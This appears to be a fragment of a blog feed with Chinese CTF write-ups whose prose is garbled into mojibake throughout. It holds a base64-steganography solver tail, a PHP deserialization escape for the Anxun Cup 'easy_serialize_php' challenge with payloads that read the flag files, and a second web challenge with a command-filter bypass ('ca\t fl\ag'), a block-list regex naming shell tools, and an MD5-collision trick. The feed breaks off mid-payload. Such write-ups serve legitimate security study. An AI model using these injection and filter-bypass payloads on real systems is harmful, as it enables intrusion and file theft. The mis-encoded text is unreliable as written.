class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¾“å…¥base64éšå†™åçš„å†…å®¹å³å¯</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–ä¸“é¢˜</title>
      <link href="2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/"/>
      <url>2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ€è¿‘å¯¹ååºåˆ—åŒ–äº§ç”Ÿäº†ä¸€äº›å…´è¶£ï¼Œæ‰€ä»¥å¼€æ­¤ç¯‡å†…å®¹è®°å½•æ‰€é‡åˆ°çš„ååºåˆ—åŒ–çš„é—®é¢˜ã€‚"><a href="#æœ€è¿‘å¯¹ååºåˆ—åŒ–äº§ç”Ÿäº†ä¸€äº›å…´è¶£ï¼Œæ‰€ä»¥å¼€æ­¤ç¯‡å†…å®¹è®°å½•æ‰€é‡åˆ°çš„ååºåˆ—åŒ–çš„é—®é¢˜ã€‚" class="headerlink" title="æœ€è¿‘å¯¹ååºåˆ—åŒ–äº§ç”Ÿäº†ä¸€äº›å…´è¶£ï¼Œæ‰€ä»¥å¼€æ­¤ç¯‡å†…å®¹è®°å½•æ‰€é‡åˆ°çš„ååºåˆ—åŒ–çš„é—®é¢˜ã€‚"></a>æœ€è¿‘å¯¹ååºåˆ—åŒ–äº§ç”Ÿäº†ä¸€äº›å…´è¶£ï¼Œæ‰€ä»¥å¼€æ­¤ç¯‡å†…å®¹è®°å½•æ‰€é‡åˆ°çš„ååºåˆ—åŒ–çš„é—®é¢˜ã€‚</h1><h2 id="å®‰æ´µæ¯-easy-serialize-php"><a href="#å®‰æ´µæ¯-easy-serialize-php" class="headerlink" title="å®‰æ´µæ¯  easy_serialize_php"></a>å®‰æ´µæ¯  easy_serialize_php</h2><p>é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">    highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">    eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">    $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å¤§æ¦‚çš„æµç¨‹æ˜¯ä»æµè§ˆå™¨æ¥å—GETæ–¹å¼çš„functionï¼Œæ ¹æ®æç¤ºåœ¨phpinfoé‡Œé¢æœ‰ä¸œè¥¿ã€‚</p><p>è¿›å…¥phpinfoåæœç´¢å¾—åˆ° d0g3_f1ag.phpè¿™ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯çŒœæµ‹éœ€è¦é€šè¿‡ååºåˆ—åŒ–æ„é€ æ‰§è¡Œè‡³ç¨‹åºæœ€åä¸€è¡Œçš„file_get_contnets().</p><p>é‚£ä¹ˆçœ‹file_get_contents()æ˜¯å¯¹ ç»è¿‡æ»¤åã€åºåˆ—åŒ–åçš„serialize_infoçš„ååºåˆ—åŒ–å–å…¶imgå±æ€§çš„ç»“æœã€‚</p><p>å…ˆä¸ç®¡æ­£åˆ™è¿‡æ»¤ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ„é€ ä¸€ä¸ªè¾“å…¥ï¼Œè®©imgçš„valueä¸ºbase64åŠ å¯†åçš„d0g3_f1ag.phpã€‚</p><p>ç›®æ ‡ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;highlight_file&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ­£å¸¸è¾“å…¥çš„è¯æˆ‘ä»¬æ˜¯æ— æ³•ç»•è¿‡ img_path çš„åˆ¤å®šçš„ã€‚</p><p>æ‰€ä»¥è¿™é‡Œæ ¹æ®è¿‡æ»¤å…¥æ‰‹ï¼Œæ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ä»¥åŠpreg_repaceæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå°†ä¸€äº›å…³é”®å­—æ›¿æ¢æˆäº†æ— ï¼Œå³å»æ‰ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨POSTæ–¹æ³•ï¼Œå¯¹_SESSION[]æ•°ç»„ä¼ å‚ï¼Œä¼ å…¥çš„keyä¸ºé»‘åå•çš„å€¼ï¼Œè¿™æ ·åœ¨åºåˆ—åŒ–å®Œä¹‹åä¼šåƒæ‰è¯¥keyçš„éƒ¨åˆ†valueã€‚</p><p>å¬ä¸æ‡‚æ­£å¸¸ï¼Œä¸€å¼€å§‹æˆ‘ä¹Ÿå¬ä¸æ‡‚ï¼Œæˆ‘å°±ä¸åƒå…¶ä»–åšä¸»ä¸€æ ·ç»™ä½ ç”¨ä¸åŒçš„é¢œè‰²æ ‡å‡ºæ¥å“ªé‡Œæ˜¯åƒæ‰çš„éƒ¨åˆ†äº†ã€‚</p><p>é¦–å…ˆè¦äº†è§£phpåºåˆ—åŒ–åçš„è¯­æ³•ï¼ˆè¿™é‡Œä¸èµ˜è¿°ï¼‰</p><p>æˆ‘ä»¬å…ˆéšä¾¿å†™å†™ï¼Œå…ˆPOSTä¸ª_SESSION[flag]=s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}</p><p>çœ‹çœ‹ç»“æœæ˜¯ä»€ä¹ˆï¼ˆæŠŠä»£ç æ‹·è´åˆ°æœ¬åœ°ï¼Œç„¶åæœ¬åœ°è¿è¡Œï¼Œechoæˆ–è€…var_dumpå‡ºæ¥åºåˆ—åŒ–åçš„ç»“æœï¼‰ï¼š</p><p> a:2:{s:4:â€â€;s:39:â€s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;} </p><p>ä½†æ˜¯è¿™æ ·æ˜¯ä¸èƒ½æ­£å¸¸ååºåˆ—åŒ–çš„ï¼Œå› ä¸ºä¸ç¬¦åˆååºåˆ—åŒ–çš„è¯­æ³•è§„åˆ™ã€‚æ ¹æ®è¯­æ³•è§„åˆ™çŸ¥é“ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è®©imgä½œä¸ºkeyï¼Œbase64åŠ å¯†åçš„ä¸œè¥¿ä½œä¸ºvalueçš„è¯ï¼Œéœ€è¦è®©ä¸Šä¸€ä¸ªå¯¹è±¡æ˜¯æ­£å¸¸çš„ï¼Œç¬¦åˆåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²çš„è¯­æ³•ã€‚</p><p>ä»å‰å¾€åçœ‹ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡çš„keyä¸º**â€;s:**ï¼Œè¿™æ ·ä¼šå¯¼è‡´åé¢çš„å­—ç¬¦ä¸²æ— æ³•æ­£å¸¸åœ°ååºåˆ—åŒ–ã€‚</p><p>æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥éœ€è¦åšçš„æ˜¯å…ˆæŠŠç¬¬ä¸€ä¸ªå¯¹è±¡çš„keyå’Œvalueè¡¥å…¨ï¼Œè®©å…¶èƒ½æ­£å¸¸åœ°ååºåˆ—åŒ–ã€‚</p><p>è¡¥å…¨ç¬¬ä¸€ä¸ªkeyçš„è¯ï¼Œéœ€è¦è®©ç¬¬ä¸€ä¸ªkeyä¸º**â€;s:39:â€**ï¼Œæ‰€ä»¥éœ€è¦åœ¨POSTé‡Œé¢ä¼ å…¥_SESSION[flagflag]ï¼Œè¿™æ ·èƒ½åæ‰å…«ä¸ªä½ç½®ã€‚æ­£å¥½èƒ½è®©æœ¬æ®µè¯åŠ ç²—çš„å†…å®¹ä½œä¸ºç¬¬ä¸€ä¸ªkeyï¼ˆè¿™é‡Œå»ºè®®è‡ªå·±å†™å†™è¯•è¯•ï¼Œçœ‹çœ‹æ˜¯å¦ç¬¦åˆååºåˆ—åŒ–è¯­æ³•çš„è§„åˆ™ã€‚ï¼‰</p><p>è¡¥å…¨ä¹‹å<strong>è¯·å¤§å®¶è‡ªå·±var_dumpæˆ–è€…è¾“å‡ºï¼Œæˆ‘è¿™é‡Œä¸ä¼šç»™å‡ºè¡¥å…¨åè¾“å‡ºçš„åºåˆ—åŒ–ç»“æœã€‚</strong></p><p>è¡¥å…¨åå‘ç°ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡å¯ä»¥æ­£å¸¸åºåˆ—åŒ–äº†ï¼Œä½†æ˜¯é—®é¢˜å°±æ˜¯ç¬¬äºŒä¸ªå¯¹è±¡çš„keyæˆäº†ç¬¬ä¸€ä¸ªå¯¹è±¡çš„valueã€‚</p><p>æ‰€ä»¥è¿™é‡Œéœ€è¦ç»™ç¬¬ä¸€ä¸ªå¯¹è±¡è¡¥ä¸ªkeyï¼Œç»™_SESISON[flagflag]ç»§ç»­ä¼ å€¼å°±å¯ä»¥ï¼Œå…·ä½“ä¼ ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·ä¼ ï¼Œæˆ‘ä¹Ÿä¸ä¼šè¯´ã€‚æ€»ä¹‹æˆ‘ä»¬çš„ç›®çš„æ˜¯ä¼ ä¸€ä¸ªç¬¦åˆåºåˆ—åŒ–æ ¼å¼çš„valueï¼Œå¹¶ä¸”ä¼ å…¥åä¹Ÿéœ€è¦è®©å‰åéƒ½ç¬¦åˆåºåˆ—åŒ–æ ¼å¼ã€‚</p><p>éšä¾¿å†™ä¸€ä¸ªå°±å¥½ æ¯”å¦‚ s:3:â€aaaâ€;  </p><p>é¦–å…ˆä½ æŠŠä»–å†™è¿›å»ï¼Œç„¶åæ ¹æ®åºåˆ—åŒ–æ ¼å¼åœ¨å‰åæ·»åŠ ç›¸å…³ç¬¦å·ã€‚è¿åŒåˆšæ‰å†™çš„s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}ä¸€èµ·å°±æ˜¯_SESSION[flagflag]= s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}</p><p>ç°åœ¨æ”¾è¿›å»çœ‹çœ‹æ˜¯ä»€ä¹ˆæ•ˆæœã€‚æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–</p><p>a:2:{s:8:â€â€;s:46:â€s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;} </p><p>è¿™æ ·å‘ç°è¿˜æ˜¯ä¸èƒ½æ­£å¸¸åœ°ååºåˆ—åŒ–ï¼Œå› ä¸ºä¸ç¬¦åˆè¯­æ³•ã€‚åœ¨s:3å‰ç¼ºå°‘ä¸Šä¸€ä¸ªå­—æ®µçš„é—­åˆâ€;    åŠ ä¸Šå°±å¥½ã€‚</p><p>æ‰€ä»¥æœ€ç»ˆçš„payloadå°±æ˜¯</p><p>_SESSION[flagflag]=â€;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}</p><p>æ‰“è¿‡å»åæŸ¥çœ‹æºç ï¼Œå‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢ç»§ç»­æ‰“å¯¹åº”çš„æ–‡ä»¶å°±å¥½äº†~</p><p>_SESSION[flagflag]=â€;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€L2QwZzNfZmxsbGxsbGFnâ€;}</p><p>æ‰“è¿›å»å³å¯è·å¾—ä¸€æšflagã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯web</title>
      <link href="2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/"/>
      <url>2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/</url>
      
        <content type="html"><![CDATA[<h1 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h1><p><a href="https://www.cnblogs.com/Cl0ud/p/12585242.html">https://www.cnblogs.com/Cl0ud/p/12585242.html</a></p><h1 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h1><p>æ‰“å¼€é¢˜ç›®ï¼Œè§‚å¯ŸURLä¸º<a href="http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=">http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p><p>äºæ˜¯çŒœæµ‹æœ‰ä¸ªæ–‡ä»¶è¯»å–å’Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯æ–‡ä»¶è¯»å–çš„æ ¼å¼æ˜¯åŠ å¯†çš„ï¼Œè€ƒè™‘base64è§£å¯†ï¼Œè§£å¯†ä¸¤æ¬¡åå†hex2asciiï¼Œå¯ä»¥å¾—åˆ°æ–‡ä»¶åã€‚</p><p>copyå¤§ä½¬çš„è„šæœ¬ï¼Œè¾“å…¥æ–‡ä»¶åå³å¯å¾—åˆ°æ ¹æ®æ­¤åŠ å¯†è§„å¾‹åŠ å¯†åçš„æ–‡ä»¶åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">filename = <span class="built_in">input</span>().encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">hex</span> = binascii.b2a_hex(filename)  <span class="comment">#b2aæ˜¯è¿”å›äºŒè¿›åˆ¶æ•°æ®çš„16è¿›åˆ¶è¡¨ç¤º</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>)</span><br><span class="line">base1 = base64.b64encode(<span class="built_in">hex</span>)</span><br><span class="line">base2 = base64.b64encode(base1)</span><br><span class="line"><span class="built_in">print</span>(base2.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å…¥index.phpåå¯ä»¥å¾—åˆ°index.phpæ–‡ä»¶åçš„åŠ å¯†åçš„åå­—ï¼Œæ”¾åˆ°imgé‡Œé¢æŸ¥çœ‹æºä»£ç ä¸ºbase64åŠ å¯†çš„ï¼ŒæŠŠbase64è§£å¯†åå³å¯å¾—åˆ°index.phpçš„æºä»£ç </p><p>index.phpæºç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &quot;success&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>å¯¹æºç è¿›è¡Œå®¡è®¡ï¼Œé‡ç‚¹åœ¨å‘½ä»¤æ‰§è¡Œéƒ¨åˆ†ã€‚</p><p>å‘½ä»¤æ‰§è¡Œæœ‰å¾ˆå¤šè¿‡æ»¤ï¼Œè¿™é‡Œè¿‡æ»¤ä¸å®Œå…¨ï¼ˆæ­£åˆ™è¡¨è¾¾å¼æœ‰å¾…å­¦ä¹ ï¼‰ï¼Œå¯ç”¨ca\t%20fl\agç»•è¿‡ã€‚</p><p>åœ¨å‘½ä»¤æ‰§è¡Œå‰éœ€è¦æ»¡è¶³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è€ƒè™‘fastcollæ„é€ ä¸¤ä¸ªhashå€¼ç›¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>æˆ‘è¿™é‡Œæ„é€ å¥½äº†ï¼Œå…·ä½“çš„ä½¿ç”¨æ–¹æ³•å¯ä»¥ç™¾åº¦fastcollã€‚</p><p>ä½¿ç”¨è¯¥è½¯ä»¶æ„é€ å¥½åï¼Œä½¿ç”¨å¦‚ä¸‹phpè„šæœ¬å¯ä»¥è·å¾—urlencodeåçš„md5å€¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function  readmyfile($path)&#123;</span><br><span class="line">    $fh &#x3D; fopen($path, &quot;rb&quot;);</span><br><span class="line">    $data &#x3D; fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;äºŒè¿›åˆ¶hash &#39;. md5( (readmyfile(&quot;1.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;1.txt&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;1.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;äºŒè¿›åˆ¶hash &#39;.md5( (readmyfile(&quot;2.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &#39;URLENCODE &#39;.  urlencode(readmyfile(&quot;2.txt&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°†è¿™ä¸¤ä¸ªMD5å€¼åˆ†åˆ«ç»™POSTçš„aå’Œbèµ‹å€¼ï¼ŒåŒæ—¶URLçš„?cmd=ca\t%20fl\ag</p><p>è¿™é‡Œæˆ‘è¸©äº†ä¸ªå‘ï¼Œä¸€å¼€å§‹æ˜¯GETæ–¹å¼æäº¤è¯·æ±‚ï¼Œç„¶åæ‰‹åŠ¨æ”¹æ–¹æ³•ä¸ºPOSTï¼Œä¸€ç›´ä¸èƒ½æˆåŠŸï¼Œåæ¥å‘ç°å¯èƒ½æ˜¯æŸäº›è¯·æ±‚å¤´çš„é—®é¢˜ï¼Œæˆ‘è¿™é‡Œç”¨hackbarå‘é€POSTè¯·æ±‚ï¼Œè¯·æ±‚ä½“éšä¾¿å†™ï¼Œåœ¨BPé‡Œé¢æŠ“åŒ…ï¼Œå°†è¯·æ±‚ä½“çš„å†…å®¹æ”¹æˆaå’Œbçš„å€¼ï¼Œåœ¨æ­¤ä¹‹åå³å¯æ„‰å¿«åœ°å‘½ä»¤æ‰§è¡Œã€‚</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 